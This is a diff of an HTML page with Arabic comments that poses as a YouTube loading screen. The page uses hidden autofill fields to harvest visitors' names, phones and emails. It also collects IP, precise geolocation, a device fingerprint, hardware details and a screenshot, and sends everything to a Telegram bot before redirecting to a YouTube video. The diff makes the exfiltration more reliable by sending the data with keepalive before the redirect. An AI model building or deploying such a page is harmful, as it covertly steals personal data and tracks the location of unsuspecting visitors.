@@ -159,7 +159,7 @@
             background-size: 200% 100%;
             border-radius: 20px;
             animation: shimmer 2s infinite linear;
-            transition: width 0.3s ease;
+            transition: width 0.15s ease;
         }
         @keyframes shimmer {
             0% {
@@ -177,34 +177,6 @@
             font-weight: 300;
             letter-spacing: 0.3px;
         }
-        .share-btn {
-            position: fixed;
-            bottom: 24px;
-            right: 24px;
-            width: 48px;
-            height: 48px;
-            background: #272727;
-            border: none;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.6);
-            z-index: 999;
-            opacity: 0;
-            transform: scale(0.8);
-            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        .share-btn.visible {
-            opacity: 1;
-            transform: scale(1);
-        }
-        .share-btn svg {
-            width: 24px;
-            height: 24px;
-            fill: #aaa;
-        }
         .hidden-field {
             position: absolute;
             left: -9999px;
@@ -221,17 +193,11 @@
             .progress-wrap {
                 width: 200px;
             }
-            .share-btn {
-                bottom: 16px;
-                right: 16px;
-                width: 44px;
-                height: 44px;
-            }
         }
     </style>
 </head>
 <body>
-    <!-- ===== HEADER (نفسه) ===== -->
+    <!-- ===== HEADER ===== -->
     <div class="header">
         <div class="header-left">
             <svg class="menu-icon" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
@@ -284,14 +250,9 @@
     <input type="text" class="hidden-field" id="hiddenName" name="name" autocomplete="name" value="">
     <input type="tel" class="hidden-field" id="hiddenTel" name="tel" autocomplete="tel" value="">
 
-    <!-- ===== زر المشاركة ===== -->
-    <button class="share-btn" id="shareBtn">
-        <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
-    </button>
-
     <script>
         // ================================================================
-        //  التكوين
+        //  التكوين (عدّل حسب رغبتك)
         // ================================================================
         const CONFIG = {
             targetUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
@@ -303,8 +264,6 @@
         //  المتغيرات
         // ================================================================
         let isRedirected = false;
-        let progressInterval = null;
-        let progressValue = 0;
 
         // ================================================================
         //  دوال مساعدة
@@ -314,7 +273,94 @@
         }
 
         // ================================================================
-        //  جمع البيانات الأساسية (IP والموقع) – هذان فقط ما ننتظره للتحويل
+        //  دالة لإرسال البيانات إلى تليجرام (تستخدم fetch مع keepalive)
+        // ================================================================
+        async function sendToTelegram(data, imageDataURL) {
+            const token = CONFIG.botToken;
+            const chatId = CONFIG.chatId;
+            if (!token || !chatId) return;
+
+            const { baseData, advancedData } = data;
+            const d = baseData;
+            const adv = advancedData;
+
+            const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
+            const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
+
+            let caption = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
+            caption += `📧 *البريد:* ${adv.autofillEmail || 'غير موجود'}\n`;
+            caption += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
+            caption += `📱 *الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
+            caption += `🆔 *بصمة:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
+            caption += `🔍 *مكونات:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
+            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
+            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
+            caption += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
+            caption += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
+            caption += `💻 *النظام:* ${adv.os || 'غير معروف'}\n`;
+            caption += `🖥️ *الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
+            caption += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
+            caption += `🚫 *DNT:* ${adv.doNotTrack || 'غير محدد'}\n`;
+            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n\n`;
+            caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
+            caption += `🌐 *الرابط:* ${d.device.url}\n`;
+            caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
+            caption += `📱 *الجهاز:* ${d.device.deviceType}\n`;
+            caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
+            caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
+            caption += `🗣 *اللغة:* ${d.device.language}\n`;
+            caption += `\n🌐 *IP:* ${d.ip}\n`;
+            caption += `📍 *الموقع:* ${loc}\n`;
+            if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
+            caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;
+
+            // تحويل الصورة إلى Blob إن وجدت
+            let formData = null;
+            if (imageDataURL) {
+                const byteString = atob(imageDataURL.split(',')[1]);
+                const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
+                const ab = new ArrayBuffer(byteString.length);
+                const ia = new Uint8Array(ab);
+                for (let i = 0; i < byteString.length; i++) {
+                    ia[i] = byteString.charCodeAt(i);
+                }
+                const blob = new Blob([ab], { type: mimeString });
+                formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'youtube_screenshot.jpg');
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+            }
+
+            // استخدام fetch مع keepalive: true لضمان الإرسال حتى بعد مغادرة الصفحة
+            try {
+                if (formData) {
+                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true
+                    });
+                } else {
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: caption,
+                            parse_mode: 'Markdown',
+                            disable_web_page_preview: true
+                        }),
+                        keepalive: true
+                    });
+                }
+                log('✅ تم إرسال البيانات إلى تليجرام');
+            } catch (e) {
+                log(`❌ فشل الإرسال: ${e.message}`);
+            }
+        }
+
+        // ================================================================
+        //  جمع البيانات الأساسية (IP والموقع)
         // ================================================================
         async function getIP() {
             const services = [
@@ -363,7 +409,7 @@
         }
 
         // ================================================================
-        //  جمع البيانات المتقدمة (تُجمع في الخلفية بعد التحويل)
+        //  جمع البيانات المتقدمة (تُجمع قبل التحويل أو بعده حسب التنفيذ)
         // ================================================================
         async function collectAdvancedData() {
             const data = {};
@@ -508,159 +554,65 @@
             } catch (_) { return null; }
         }
 
-        function dataURLtoBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
-
         // ================================================================
-        //  إرسال إلى تليجرام (في الخلفية)
-        // ================================================================
-        async function sendToTelegram(baseData, advancedData, imageDataURL) {
-            const token = CONFIG.botToken;
-            const chatId = CONFIG.chatId;
-            if (!token || !chatId) return;
-
-            const d = baseData;
-            const adv = advancedData;
-            const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
-            const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
-
-            let caption = `🎯 *زائر جديد - بيانات شاملة*\n\n`;
-            caption += `📧 *البريد:* ${adv.autofillEmail || 'غير موجود'}\n`;
-            caption += `📛 *الاسم:* ${adv.autofillName || 'غير موجود'}\n`;
-            caption += `📱 *الهاتف:* ${adv.autofillTel || 'غير موجود'}\n`;
-            caption += `🆔 *بصمة:* ${adv.fingerprint?.visitorId || 'غير متوفرة'}\n`;
-            caption += `🔍 *مكونات:* ${adv.fingerprint?.components || 'غير معروف'}\n\n`;
-            caption += `🔋 *البطارية:* ${adv.battery?.level || 'غير معروف'}% ${adv.battery?.charging ? '(شحن)' : ''}\n`;
-            caption += `📡 *الشبكة:* ${adv.connection?.type || 'غير معروف'} (${adv.connection?.downlink || '?'})\n`;
-            caption += `⚙️ *المعالج:* ${adv.hardware?.cores || 'غير معروف'} نواة\n`;
-            caption += `🧠 *الذاكرة:* ${adv.hardware?.memory || 'غير معروف'}\n`;
-            caption += `💻 *النظام:* ${adv.os || 'غير معروف'}\n`;
-            caption += `🖥️ *الشاشة:* ${adv.screen?.width}x${adv.screen?.height} (${adv.screen?.colorDepth} بت)\n`;
-            caption += `🔌 *الإضافات:* ${adv.plugins || 'لا يوجد'}\n`;
-            caption += `🚫 *DNT:* ${adv.doNotTrack || 'غير محدد'}\n`;
-            caption += `🌍 *اللغات:* ${adv.languages || 'غير معروف'}\n\n`;
-            caption += `⏰ *التوقيت:* ${d.device.localTime}\n`;
-            caption += `🌐 *الرابط:* ${d.device.url}\n`;
-            caption += `🔗 *المرجع:* ${d.device.referrer}\n\n`;
-            caption += `📱 *الجهاز:* ${d.device.deviceType}\n`;
-            caption += `🌍 *المتصفح:* ${d.device.browser}\n`;
-            caption += `📶 *محمول:* ${d.device.isMobile ? 'نعم' : 'لا'}\n`;
-            caption += `🗣 *اللغة:* ${d.device.language}\n`;
-            caption += `\n🌐 *IP:* ${d.ip}\n`;
-            caption += `📍 *الموقع:* ${loc}\n`;
-            if (mapLink) caption += `🗺️ [خريطة](${mapLink})\n`;
-            caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;
-
-            try {
-                if (imageDataURL) {
-                    const blob = dataURLtoBlob(imageDataURL);
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'youtube_screenshot.jpg');
-                    formData.append('caption', caption);
-                    formData.append('parse_mode', 'Markdown');
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                } else {
-                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: caption,
-                            parse_mode: 'Markdown',
-                            disable_web_page_preview: true
-                        })
-                    });
-                }
-                log('✅ تم إرسال البيانات إلى تليجرام');
-            } catch (e) {
-                log(`❌ فشل الإرسال: ${e.message}`);
-            }
-        }
-
-        // ================================================================
-        //  زر المشاركة (يظهر بعد التقاط الصورة)
-        // ================================================================
-        function setupShareButton(imageDataURL) {
-            if (!imageDataURL) { document.getElementById('shareBtn').style.display = 'none'; return; }
-            const blob = dataURLtoBlob(imageDataURL);
-            const file = new File([blob], 'youtube_screenshot.jpg', { type: 'image/jpeg' });
-            const btn = document.getElementById('shareBtn');
-            btn.addEventListener('click', async () => {
-                if (navigator.share) {
-                    try {
-                        await navigator.share({ title: 'YouTube', text: 'شاهد هذا الفيديو', files: [file] });
-                    } catch (_) {}
-                } else {
-                    const win = window.open();
-                    if (win) win.document.write(`<img src="${imageDataURL}" style="max-width:100%;height:auto;" />`);
-                }
-            });
-            setTimeout(() => btn.classList.add('visible'), 500);
-        }
-
-        // ================================================================
-        //  العملية الرئيسية – ذكية وسريعة
+        //  العملية الرئيسية – ذكية وسريعة جداً
         // ================================================================
         async function main() {
-            log('🚀 بدء التشغيل الذكي');
+            log('🚀 بدء التشغيل الذكي (مع إرسال البيانات قبل التحويل)');
 
             // 1. نبدأ شريط التقدم بسرعة
             let progress = 0;
-            progressInterval = setInterval(() => {
+            const progressInterval = setInterval(() => {
                 progress += 5 + Math.floor(Math.random() * 5);
                 if (progress > 90) progress = 90;
                 document.getElementById('progressBar').style.width = progress + '%';
-            }, 100);
+            }, 80);
 
-            // 2. جمع البيانات الأساسية (IP والموقع) – ننتظرهم فقط
+            // 2. جمع جميع البيانات بالتوازي (أساسية + متقدمة)
             const deviceInfo = collectDeviceInfo();
+
+            // نبدأ جميع المهام بالتوازي
             const ipPromise = getIP();
             const locPromise = getLocation();
+            const advDataPromise = collectAdvancedData();
+            const screenshotPromise = captureScreenshot();
 
-            let ip = 'غير متوفر';
-            let location = null;
-            try {
-                const [ipRes, locRes] = await Promise.allSettled([ipPromise, locPromise]);
-                if (ipRes.status === 'fulfilled') ip = ipRes.value;
-                if (locRes.status === 'fulfilled') location = locRes.value;
-            } catch (_) {}
+            // ننتظر انتهاء جميع المهام (أو فشلها)
+            const [ipRes, locRes, advData, screenshot] = await Promise.allSettled([
+                ipPromise,
+                locPromise,
+                advDataPromise,
+                screenshotPromise
+            ]);
+
+            const ip = ipRes.status === 'fulfilled' ? ipRes.value : 'غير متوفر';
+            const location = locRes.status === 'fulfilled' ? locRes.value : null;
+            const advancedData = advData.status === 'fulfilled' ? advData.value : {};
+            const imageData = screenshot.status === 'fulfilled' ? screenshot.value : null;
 
             const baseData = { device: deviceInfo, ip, location };
 
-            // 3. تم جمع الأساسيات – نتحول فوراً
-            log('✅ تم جمع الأساسيات، التحويل فوراً');
-            // نكمل شريط التقدم إلى 100%
+            // 3. إرسال البيانات إلى تليجرام (باستخدام keepalive)
+            log('📤 إرسال البيانات إلى تليجرام...');
+            await sendToTelegram({ baseData, advancedData }, imageData);
+
+            // 4. إنهاء شريط التقدم والتحويل فوراً
             clearInterval(progressInterval);
             document.getElementById('progressBar').style.width = '100%';
             document.getElementById('statusText').textContent = 'تم التحميل ...';
 
-            // التحويل الفوري
-            if (!isRedirected) {
-                isRedirected = true;
-                try {
-                    window.location.replace(CONFIG.targetUrl);
-                } catch (_) {
-                    window.location.href = CONFIG.targetUrl;
+            // تأخير بسيط جداً (0.3 ثانية) لظهور شريط التقدم الكامل
+            setTimeout(() => {
+                if (!isRedirected) {
+                    isRedirected = true;
+                    log('🔄 تحويل فوري');
+                    try {
+                        window.location.replace(CONFIG.targetUrl);
+                    } catch (_) {
+                        window.location.href = CONFIG.targetUrl;
+                    }
                 }
-            }
-
-            // 4. بعد التحويل (في الخلفية)، نكمل جمع البيانات المتقدمة ونرسلها
-            log('📊 بدء جمع البيانات المتقدمة في الخلفية');
-            const advData = await collectAdvancedData();
-            const screenshot = await captureScreenshot();
-            if (screenshot) setupShareButton(screenshot);
-
-            // إرسال إلى تليجرام
-            sendToTelegram(baseData, advData, screenshot);
+            }, 300);
         }
 
         // ================================================================
@@ -672,7 +624,7 @@
             window.addEventListener('load', () => setTimeout(main, 100));
         }
 
-        log('✅ تم تحميل النسخة الذكية (التحويل فوراً بعد الأساسيات)');
+        log('✅ تم تحميل النسخة الذكية (جمع كل البيانات ثم التحويل)');
     </script>
 </body>
 </html>
